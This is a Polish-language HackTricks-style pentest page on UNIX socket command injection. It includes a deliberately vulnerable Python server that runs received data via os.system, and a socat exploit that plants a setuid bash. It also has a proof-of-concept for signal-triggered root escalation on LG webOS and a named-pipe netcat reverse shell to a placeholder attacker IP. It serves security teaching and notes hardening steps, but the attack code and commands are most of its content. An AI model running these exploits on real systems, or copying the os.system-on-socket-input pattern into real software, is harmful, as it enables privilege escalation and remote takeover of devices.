# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding — przykład w Pythonie

W poniższym przykładzie tworzony jest **unix socket** (`/tmp/socket_test.s`), a wszystko, co zostanie **odebrane**, zostanie **wykonane** przez `os.system`. Wiem, że nie znajdziesz tego w rzeczywistych systemach, ale celem tego przykładu jest pokazanie, jak wygląda kod używający unix socketów oraz jak poradzić sobie z wejściem w najgorszym możliwym przypadku.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Uruchom** kod za pomocą python: `python s.py` i **sprawdź, jak socket nasłuchuje**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Studium przypadku: eskalacja wyzwalana sygnałem przez socket UNIX należący do root (LG webOS)

Niektóre uprzywilejowane demony wystawiają socket UNIX należący do root, który akceptuje nieufne dane wejściowe i powiązuje uprzywilejowane akcje z identyfikatorami wątków (thread-IDs) oraz sygnałami. Jeśli protokół pozwala nieuprzywilejowanemu klientowi wpłynąć na to, który natywny wątek jest celem, możesz być w stanie wywołać uprzywilejowaną ścieżkę kodu i eskalować.

Observed pattern:
- Połącz się z socketem należącym do root (np. /tmp/remotelogger).
- Utwórz wątek i uzyskaj jego natywny thread id (TID).
- Wyślij TID (spakowany) oraz padding jako żądanie; odbierz potwierdzenie.
- Dostarcz konkretny sygnał do tego TID, aby wywołać uprzywilejowane zachowanie.

Minimal PoC sketch:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Aby zamienić to w root shell, można użyć prostego wzorca named-pipe + nc:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
Uwagi:
- Ten rodzaj błędów powstaje z zaufania do wartości pochodzących ze stanu klienta bez uprawnień (TIDs) i powiązywania ich z uprzywilejowanymi handlerami sygnałów lub logiką.
- Wzmocnij poprzez wymuszanie uwierzytelnienia na socket, walidację formatów wiadomości oraz odseparowanie uprzywilejowanych operacji od zewnętrznie dostarczanych identyfikatorów wątków.

## Referencje

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
